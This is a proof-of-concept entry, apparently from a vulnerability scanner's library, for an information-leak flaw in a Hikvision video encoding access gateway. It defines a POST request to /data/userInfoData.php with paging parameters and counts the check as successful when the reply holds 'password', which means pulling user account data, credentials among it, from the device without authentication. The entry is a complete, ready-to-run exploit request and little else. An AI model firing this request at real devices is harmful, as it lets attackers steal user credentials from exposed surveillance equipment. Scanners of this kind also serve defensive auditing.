{
        'name': '海康威视视频编码设备接入网关userinfodata接口存在信息泄漏',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/data/userInfoData.php',
            'headers': {
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close'
            },
            'data': """ page=1&rows=20&sort=userId&order=asc""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'password'
        }}]
    }